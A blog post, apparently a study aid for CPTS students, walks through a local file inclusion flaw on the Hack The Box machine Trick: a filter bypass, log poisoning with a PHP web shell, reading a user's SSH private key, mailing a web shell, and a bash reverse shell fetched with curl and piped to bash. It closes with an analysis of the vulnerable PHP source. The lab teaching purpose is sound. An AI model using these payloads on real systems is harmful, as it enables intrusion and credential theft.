---
title: "Deep Dive: LFI – One LFI, Three Ways to RCE – HTB Trick"
date: 2026-09-19 17:00:00 +0200
categories:
  - Deep-dives
tags:
  - cpts-prep
  - lfi
  - php
  - log-poisoning
description: A deep dive on how to use LFI in Trick; To fully understand the 3 different ways to gain RCE with LFI on Trick
media_subpath: /assets/img/posts/trick/
---


## Disclaimer: Not a traditional writeup; A deep dive into LFI
**If you are looking for a traditional writeup of the box HTB Trick, maybe cause you are stuck somewhere and need a nudge, then my blog post is not helpful to you.**
I won't cover this box fully. I will only show the shortest path to get to the LFI part, and I will completely omit the privilege escalation part of this box.

I have a different goal with this post: To dive deep into the LFI part of the box, so you feel confident in your ability to spot and utilize LFI if you come across it.

If a traditional writeup is what you are looking for instead, I recommend checking out 0xdf's writeup, or IppSec's video on the box.

This post is meant for the students in the trenches – going through the CPTS Penetration tester path, or students who are currently prepping for taking the exam. 

This is also not the shortest read.. so consider grabbing a coffee before going in.

> **Personal experience with it: LFI module completed on HTB Academy, still feeling lost on LFI.**
>
>When I went through the modules, I've felt like I clearly understood the topics – including LFI – but when I started practicing on boxes, I felt completely lost. The main reason is probably that in the LFI Academy module, you know exactly what you are looking for, and have read about it in the module content right before you do the exercise. But out in the wild, I felt completely uncomfortable spotting it or even knowing that it might exist in the box in the first place.
{: .prompt-info }

## What to expect to learn in this post
Here is what you can expect to learn after reading:
- How to spot LFI in the wild: `Indicators of LFI`.
- How to bypass basic LFI filters: `Indicators of LFI filters`.
- What to do once you have it; What files to read.


## Who this is for and your assumed knowledge
Who?: 
- CPTS students who completed the LFI module in HTB Academy, or at least have a basic understanding of what LFI is.
- Readers interested in understanding LFI better.
- CTFers that were doing the Trick box but didn't fully grasp the LFI concept.

Assumed knowledge (not for completing the box, but to gain value out of this post): 
- Fundamental pentesting knowledge, like basic enumeration with nmap.
- Basic HTTP Request methods (GET, POST).
- Basic knowledge of linux and its file system and common files.
- A rough understanding of what LFI is.

## Short summary of Trick
Trick is an excellent showcase of how LFI can enable you to gain RCE in multiple ways on the same machine.
In Trick, you start with basic enumeration, eventually leading you to find a virtual host (`preprod-payroll.trick.htb`) through DNS zone transfer, as standard vhost fuzzing won't reveal the payroll host by itself (without already knowing the `preprod-` scheme, at least the common wordlists from seclists do not contain it, likely on purpose by the author).
One way forward is to applying the logic of the vhost naming and fuzz for `preprod-FUZZ.trick.htb` and discover a second one: `preprod-marketing`. Another way of discovering this vhost includes abusing a SQLi vuln on the payroll vhost, but this won't be covered here.
From there, several ways lead to RCE utilizing LFI, which will be the main focus of this post.
Once RCE is achieved, you escalate privileges by abusing `fail2ban` – this won't be covered in this post as well.

## Walkthrough up to the LFI entry point
The main focus of this section is, to get you to the LFI section in the shortest way possible. That means: No in depth explanation of those leading steps; No detailed commands explanation; No methodology building. 

We start off with a nmap scan, and discover 4 ports – all of which will play a role later for gaining RCE.
```console
┌──(kali㉿kali)-[~/htb/trick]
└─$ sudo nmap -sCV 10.129.70.149 -oN nmap/nmap_default.out
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-16 12:57 +0200
Nmap scan report for 10.129.70.149
Host is up (0.14s latency).
Not shown: 996 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp?
|_smtp-commands: Couldnt establish connection on port 25
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 261.97 seconds

```

We don't know the host name of the machine – other than guessing because of.. you know, the name of the box – so we utilize the `53 DNS` service on this box, to see if we can reveal it.

We run a reverse DNS query (resolve IP into Name) using the host itself as the DNS server (the `@$ip` part); 127.0.0.1 points to trick.htb
```console
┌──(kali㉿kali)-[~/htb/trick]
└─$ dig -x 10.129.70.149 @10.129.70.149

; <<>> DiG 9.20.24-1+b1-Debian <<>> -x 10.129.70.149 @10.129.70.149
;; global options: +cmd
;; Got answer:
<SNIP>
;; ADDITIONAL SECTION:
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1

;; Query time: 72 msec
;; SERVER: 10.129.70.149#53(10.129.70.149) (UDP)
;; WHEN: Wed Sep 16 13:03:50 CEST 2026
;; MSG SIZE  rcvd: 164
```

we add the name to our host file.
```console
┌──(kali㉿kali)-[~/htb/trick]
└─$ sudo nano /etc/hosts

10.129.70.149   trick.htb
```

In addition, we perform a zone transfer (need the hostname for this aka domain name), to leak any other subdomains/vhosts – and we discover one: `preprod-payroll.trick.htb`.
```console
┌──(kali㉿kali)-[~/htb/trick]
└─$ dig axfr trick.htb @10.129.70.149         

; <<>> DiG 9.20.24-1+b1-Debian <<>> axfr trick.htb @10.129.70.149
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 220 msec
;; SERVER: 10.129.70.149#53(10.129.70.149) (TCP)
;; WHEN: Wed Sep 16 13:04:51 CEST 2026
;; XFR size: 6 records (messages 1, bytes 231)
```

add to /etc/hosts
```console
┌──(kali㉿kali)-[~/htb/trick]
└─$ sudo nano /etc/hosts

10.129.70.149   trick.htb       preprod-payroll.trick.htb
```


> **The "preprod" part rang a bell for me, while working through the box..**
> 
>When I did the box, I felt like that the `preprod` part could be a template name, so to speak, and that there might be other preproduction hosts that are not in the DNS yet.
{: .prompt-tip }

Therefore, fuzzing for other vhosts with the `preprod-` prepend would be worth a try – and so we do:
```console
┌──(kali㉿kali)-[~/htb/trick]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://trick.htb -H 'Host: preprod-FUZZ.trick.htb' -ic -ac

<SNIP>

________________________________________________

marketing               [Status: 200, Size: 9660, Words: 3007, Lines: 179, Duration: 324ms]
:: Progress: [4989/4989] :: Job [1/1] :: 617 req/sec :: Duration: [0:00:15] :: Errors: 0 ::
```

We discover another vhost: `preprod-marketing.trick.htb`.
add to hosts again:
```console
┌──(kali㉿kali)-[~/htb/trick]
└─$ sudo nano /etc/hosts

10.129.70.149   trick.htb       preprod-payroll.trick.htb       preprod-marketing.trick.htb
```


> **Disclaimer**: 
> 
>The intended way to figure out the second vhost, is by exploiting an SQLi vulnerability on the `preprod-payroll` vhost, but that is not the focus of this blog post – though it is an alternative way; Many roads lead to rome.
{: .prompt-warning }


Visiting the page confirms that this vhost is actually running – also confirming that both are indeed different vhosts:
http://preprod-payroll.trick.htb & http://preprod-marketing.trick.htb

The main focus of the deep dive will be the LFI vulnerability in the newly discovered `preprod-marketing` vhost.

## The Main Part – 1 LFI, 3 Ways To RCE
Here begins the deep dive section of this article. 
I will cover **how to spot LFI**, **how to test if LFI is possible**, and ways to **bypass common LFI filters** – so you feel confident spotting it in the wild, or in your CPTS exam.
Pay attention to the "`Indicators of`" type callouts, those are important ones.

### Investigating the "preprod-marketing.trick.htb" vhost
Upon discovering and visiting the marketing vhost, you are met with this landing page:
![](1.png)

Clicking on "services" – or any of the 4 links for that matter – you can notice that the URL scheme changes to `http://preprod-marketing.trick.htb/index.php?page=services.html`.
Suddenly we see `index.php` in the URL, which we previously didn't.
`Index.php` is common in webservers and often loads other files into them, like the other pages "services" and so on.
![](2.png)

We see another thing that changed – a `GET parameter` is now used to load the `services.html` page, using the `?page=` parameter: `http://preprod-marketing.trick.htb/index.php?page=services.html` – a strong Indicator of LFI possibility.

> **Indicators of LFI:**
>
>If you see something like `?page=services.html` – specifically the `?page` parameter – it is always worth testing for LFI, as this shows that the web server loads local pages from the host.
{: .prompt-warning }

So we test for LFI, by trying to read a local file. 
The most common file to read to test for LFI is`/etc/passwd`.

We attempt to traverse directories in hopes that we can load files outside the directory we are currently in: `http://preprod-marketing.trick.htb/index.php?page=../../../etc/passwd`, but it merely presents blank page.. not the result we were hoping for.
Does that mean it is not vulnerable to LFI? Not quite. We need to try to understand what is happening on the server side.

#### investigating the behaviour of the server upon loading pages
When testing for this type, or any type of web app vulnerability for that matter, it is always important that we try to understand what the logic behind the webserver is. 
In my opinion, the importance here is on asking questions: What file type is the current page?; Is the page being loaded from a directory?; Does it append a file extension to the page or not?

#### Does the server append file extensions? Does not look like to be the case.
Browsing to `http://preprod-marketing.trick.htb/index.php?page=services` (without the `.html`) loads a blank page – that means it does not append any file extension, which would prevent us from loading files like `/etc/passwd`, since it would try to resolve `/etc/passwd.html` which would fail. Otherwise the page would have loaded normally.
#### How does the server react, when we try to traverse directories?
If we try `http://preprod-marketing.trick.htb/index.php?page=../../../services.html` it still loads the page. That is unexpected – the `services.html` is likely to be contained in a web root directory like `/var/www/html/services.html`. Our version of the URL would try to load `/services.html` at the root directory, but it still presents the page. This could mean that the web server removes the `../` from out input.

Trying `http://preprod-marketing.trick.htb/index.php?page=services.html../../../` ALSO loads the same page.. usually this should cause an error due to the malformed file name, but it doesn't – yet another strong indicator that `../` gets stripped.

> **Indicators of LFI filtering (Path Traversal Filters):**
>
>If the current page loads like `index.php?page=services.html`, and you **prepend** or **append** `../` and it still loads, that means that the web server is likely stripping the `../` from your input, before it loads it.
{: .prompt-warning }

If you suspect that the web server is stripping away the `../`, it is worth checking if it does so **recursively** – meaning the webserver runs several iterations of the stripping process until the `../` is not contained in the input anymore – it's worth trying doubling up like `....//`.
#### confirm the server is stripping directory traversal (../) and successfully read /etc/passwd
A common but unsecure way of stripping characters like `../` is to make use of the `str_replace` function, which checks if the input you submitted contains `../` and removes it, if it is the case.
The problem here is, that it only runs through our input once, not recursively. If we submit something like `....//` it would – as we suspect – strip away `../`, but that would still leave one `../` in place. To better understand what I mean, take a look at the following code block and read the comments (`#`):
```console
# Our URL:
http://preprod-marketing.trick.htb/index.php?page=....//....//....//etc/passwd

# the web server applying the non recursive path traversal filter would leave this
http://preprod-marketing.trick.htb/index.php?page=../../../etc/passwd
```

And voilà, we successfully read `/etc/passwd`:
```console
┌──(kali㉿kali)-[~/htb/trick]
└─$ curl http://preprod-marketing.trick.htb/index.php?page=....//....//....//etc/passwd                           
root:x:0:0:root:/root:/bin/bash
<SNIP>
michael:x:1001:1001::/home/michael:/bin/bash
```
To understand why it happens and how to fix the code, see the [source code analysis](#source-code-analysis--where-it-fails-to-prevent-our-malicious-requests) section.


An automated version of this would be to fuzz for LFI using the `LFI-Jhaddix` file with ffuf, by fuzzing the `?page` parameter using the `LFI-Jhaddix.txt` from seclists, though it is essential to understand what your automation tool actually does:
```console
┌──(kali㉿kali)-[~/htb/trick]
└─$ ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://preprod-marketing.trick.htb/index.php?page=FUZZ" -ac 
<SNIP>
....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 61ms]
:: Progress: [930/930] :: Job [1/1] :: 1111 req/sec :: Duration: [0:00:01] :: Errors: 0 ::

```

### I have LFI.. Now what? 
#### Common ways to turn LFI into RCE
Generally speaking, common way to turn LFI into RCE are the following:
- Reading the web app config using PHP wrappers, often revealing DB credentials, then pillaging the DB server for further creds, or elevated privileges.
- Log poisoning is a big one – injecting PHP code in the User-Agent Header of your web request, then accessing the log file using the LFI vulnerability, followed by executing commands due to how php works.
- Reading other files that contain sensitive information.

#### Some common files you should attempt to read with LFI
This of course is very specific to your current situation, though there are still some general files worth checking out:
- `/etc/passwd` to understand what users exist on this host
- `/proc/self/environ`, `/proc/self/cmdline`, `/proc/self/status` to figure out the current user context the web server running in
- Web configuration files like `/etc/nginx/nginx.conf`, `/etc/nginx/sites-enabled/default`, `/etc/apache2/sites-enabled/000-default.conf`
- log files, but I'll explain in greater detail in the following section "LFI to RCE #1".


Now we will go through the three ways that you can use, to gain RCE on Trick.

## LFI to RCE – the three methods in Trick
### LFI to RCE #1: Log poisoning – the most realistic method
This is arguably the most "realistic" way out of all of the three ways of achieving RCE utilizing LFI, as the others can seem a bit "CTF like", according to what most practitioners say.

> **Proxy tool like CAIDO or Burp recommended** 
> 
>For this part, I recommend (or as an alternative to curl in earlier steps) using a proxy tool like Burp Suite or CAIDO, to be able to manipulate web requests that our machine would normally send. In my case, I utilize CAIDO.
{: .prompt-info }

Thanks to our nmap scan from earlier, we know that this webserver is Nginx (`80/tcp open  http    nginx 1.14.2`). Nginx stores log files under `/var/log/nginx/access.log`, and Apache stores them under `/var/log/apache2/access.log`.

A quick check confirms that we can read the access log:
![](3.png)

Here is what we will try to do:
Due to how the page inclusion mechanism works, it will also allow us to execute php code directly (see the [section at the end](#why-commands-get-executed-even-in-michaels-mail)). The main idea is to include a `php web shell` oneliner in our `User-Agent:` header, so it will land inside the log file. 
As we can see in the screenshot above, the log entry contains information like our IP, but also our User-Agent header:
```console
10.10.17.137 - - [17/Sep/2026:16:58:46 +0200] "GET /index.php?page=....//....//....//etc/passwd HTTP/1.1" 200 945 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
```


By including a php web shell in our user agent and sending the request, we will be able to execute commands via the `&cmd=command_here` parameter:
```php
# php web shell oneliner
<?php system($_REQUEST['cmd']); ?>
```

> **Caution:** 
>Messing this up and causing an error on the server side – like a typo in the code – the log will not read past your injected code, making this attack vector not usable anymore.
{: .prompt-danger }

Insert the php oneliner in the User-Agent header like this:
![](4.png)
Next, send the request off.
We can now see, that where the User-Agent data usually would be (the firefox thing), there is nothing, just `""` which indicates that our php web shell got processed instead of treated as text.
![](5.png)

If we now include the `&cmd` parameter (in my case `&cmd=id`) with a command, it will process and execute the command:
![](6.png)

We could now establish a reverse shell, by including hosting a bash reverse oneliner script with a python3 web server. 
First create the shell file 
```console
┌──(kali㉿kali)-[~/htb/trick]
└─$ nano bash_oneliner.sh
```
save it like this:
```console
#!/bin/bash
bash -i >& /dev/tcp/10.10.17.137/8080 0>&1
```

start your nc listener
```console
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 8080          
listening on [any] 8080 ...

```
and your python web server:
```console
┌──(kali㉿kali)-[~/htb/trick]
└─$ sudo python3 -m http.server 80
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Then, execute the following command, to download the shell script and immediately execute it (Important: you must URL encode your command):
`curl 10.10.17.137/bash_oneliner.sh|bash`
![](9.png)
```console
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 8080
listening on [any] 8080 ...
connect to [10.10.17.137] from (UNKNOWN) [10.129.227.180] 56632
bash: cannot set terminal process group (712): Inappropriate ioctl for device
bash: no job control in this shell
michael@trick:/var/www/market$ id
id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
michael@trick:/var/www/market$ 
```
RCE confirmed.
### LFI to RCE #2: Reading michael's SSH key – the shortest and simplest method
Though unusual, this web server is not running as a web service user like `www-data`, instead it runs as `michael` – a local user.
When we read `/etc/passwd`, we could see that there is one user account: `michael:x:1001`, but no "www-data" or anything. Web servers usually run under a service user like "www-data".
The next step would be to figure out what user the web server is running as.

One way to do so, is to read the `/proc/self/status` and comparing the found UID listed, with the UIDs found in `/etc/passwd`:
```console
┌──(kali㉿kali)-[~/htb/trick]
└─$ curl "http://preprod-marketing.trick.htb/index.php?page=....//....//....//proc/self/status"
Name:   php-fpm7.3
Umask:  0022
State:  R (running)
Tgid:   741
Ngid:   0
Pid:    741
PPid:   712
TracerPid:      0
Uid:    1001    1001    1001    1001
<SNIP>
```

The UIDs look identical; Web server is confirmed running as michael.

Now here is the odd part.. michael seems to be a normal system user. If you remember, Port 22 was exposed too.. chances are michael utilizes SSH to access this server, preferably using an SSH key.
A quick check would be to see if – since we are reading files as michael – read his SSH key, which in turn we could use to establish a direct shell session.

User SSH keys are usually contained inside `/home/user_name/.ssh/id_rsa`.

And a quick check confirms our suspicion:
```console
$ curl "http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa"
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
<REDACTED>
jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----

```

Saving the key on our box, modifying its permission setting (linux requires you to do so), and logging in with the SSH as michael (no password needed), proved to be a success:
```console
# save SSH key to file
┌──(kali㉿kali)-[~/htb/trick]
└─$ curl "http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa" > michael_id_rsa

# modify permission settings of SSH key
┌──(kali㉿kali)-[~/htb/trick]
└─$ chmod 600 michael_id_rsa 

# Logging in as michael
┌──(kali㉿kali)-[~/htb/trick]
└─$ ssh michael@trick.htb -i michael_id_rsa 
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
michael@trick:~$
```

### LFI to RCE #3: the intended way of the box creator – sending a mail using swaks and reading it using LFI
The last way – the intended way – is to utilize the `25 SMTP` server to send a mail to `michael`, then utilizing the LFI that we have to read the mail, as the web server is running as michael, thus granting us read access to his mailbox at `/var/mail/michael`



```console
┌──(kali㉿kali)-[~/htb/trick]
└─$ swaks --to michael --from netrunner --header "Subject: totally normal email" --body "No, really, a totally normal email." --server 10.129.227.180
=== Trying 10.129.227.180:25...
=== Connected to 10.129.227.180.
<-  220 debian.localdomain ESMTP Postfix (Debian/GNU)
 -> EHLO kali
<-  250-debian.localdomain
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-STARTTLS
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250-DSN
<-  250-SMTPUTF8
<-  250 CHUNKING
 -> MAIL FROM:<netrunner>
<-  250 2.1.0 Ok
 -> RCPT TO:<michael>
<-  250 2.1.5 Ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Fri, 18 Sep 2026 15:41:27 +0200
 -> To: michael
 -> From: netrunner
 -> Subject: totally normal email
 -> Message-Id: <20260918154127.031703@kali>
 -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
 -> 
 -> No, really, a totally normal email.
 -> 
 -> 
 -> .
<-  250 2.0.0 Ok: queued as E414F4099C
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.
```

> **Caution, something keeps removing the mails**
> 
>It seems like there is a clean up script running, likely implemented when the box used to be an active machine, thus probably trying to prevent reading other players exploitation attempts.. at least that is my guess.
{: .prompt-warning }

```console
┌──(kali㉿kali)-[~/htb/trick]
└─$ curl "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//var/mail/michael"
From netrunner@debian.localdomain  Fri Sep 18 15:46:40 2026
Return-Path: <netrunner@debian.localdomain>
X-Original-To: michael
Delivered-To: michael@debian.localdomain
Received: from kali (unknown [10.10.17.137])
        by debian.localdomain (Postfix) with ESMTP id 70DAA4099C
        for <michael>; Fri, 18 Sep 2026 15:46:40 +0200 (CEST)
Date: Fri, 18 Sep 2026 15:46:20 +0200
To: michael
From: netrunner
Subject: totally normal email
Message-Id: <20260918154620.037633@kali>
X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/

No, really, a totally normal email.

```
The mail successfully reached michael's mailbox.

Next, we have to send a malicious mail with the php web shell from earlier:
```php
# php web shell oneliner
<?php system($_REQUEST['cmd']); ?>
```

So we craft the mail again, this time using the php web shell oneliner as the body, like this:
```console
swaks --to michael --from netrunner --header "Subject: this one is definitely a normal email" --body '<?php system($_REQUEST["cmd"]); ?>' --server 10.129.227.180

<SNIP>
```

> **Note:**
> 
>in the `--body` I used single quotes for the payload, as using double quotes would mess up the payload, due to how bash interprets some characters like `$`.
{: .prompt-info }

Reading the mail again, this time including `&cmd=id` at the end, confirms we have working RCE (the last line is the `id` command output):
```console
┌──(kali㉿kali)-[~/htb/trick]
└─$ curl "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//var/mail/michael&cmd=id"
From netrunner@debian.localdomain  Fri Sep 18 16:06:04 2026
Return-Path: <netrunner@debian.localdomain>
X-Original-To: michael
Delivered-To: michael@debian.localdomain
Received: from kali (unknown [10.10.17.137])
        by debian.localdomain (Postfix) with ESMTP id 445F54099C
        for <michael>; Fri, 18 Sep 2026 16:06:04 +0200 (CEST)
Date: Fri, 18 Sep 2026 16:05:43 +0200
To: michael
From: netrunner
Subject: this one is definitely a normal email
Message-Id: <20260918160543.059932@kali>
X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/

uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
```

See the [Source code analysis](#source-code-analysis--where-it-fails-to-prevent-our-malicious-requests) section below to understand why this works
>**But why does reading his mail execute PHP code / commands?**
>
>When I was working on the box, it didn't make sense to me that this executes commands – I am not a web dev, nor do I have experience with PHP.
{: .prompt-info }

### Source code analysis – where it fails to prevent our malicious requests
Using the SQLi vulnerability – that I have not covered in this post – we are actually able to read the source code of `index.php` (check official writeup, 0xdf, or ippsec to see how to get it):
```php
<?php
$file = $_GET['page'];

if(!isset($file) || ($file=="index.php")) {
   include("/var/www/market/home.html");
}
else{
        include("/var/www/market/".str_replace("../","",$file));
}
?>

```
With access to the code, we are able to answer a couple of questions one might come up with during trick:
#### Why this code fails to filter our path traversal
The reason why we are able to still include files using `....//`, is because `str_replace("../","",$file)` only goes through our input once. So it scans our input left to right, removes all `../`, but fails to re-examine the result.

If it sees `....//etc/passwd` it will remove `../`, effectively leaving `../etc/passwd`. The code never checks how our input looks like, after it has applied the filtering rule (I hope this makes sense to you).

There is also no code in place that checks for file extensions, like `.php`, or a MIME type check.
#### why commands get executed, even in michael's mail
`include()` is actually how PHP loads source, so any file it touches gets parsed: plain text gets echoed, but anything after `<?php` gets executed.

So PHP goes through our file inclusion attempt (`index.php?page=....//....//....//var/mail/michael&cmd=id`).
Since we included the php web shell oneliner in the mail, the mail file sort of says "run whatever the URL tells me", which is the `&cmd=id` part from `<?php system($_REQUEST['cmd']); ?>`.


## Final words
This concludes my deep dive into LFI. I hope this helped you gain a deeper understanding of how LFI works, and that you now feel more confident in spotting it and utilizing it. Was it a long read? ... Yeah absolutely, definitely, but I hope it was worth your time.
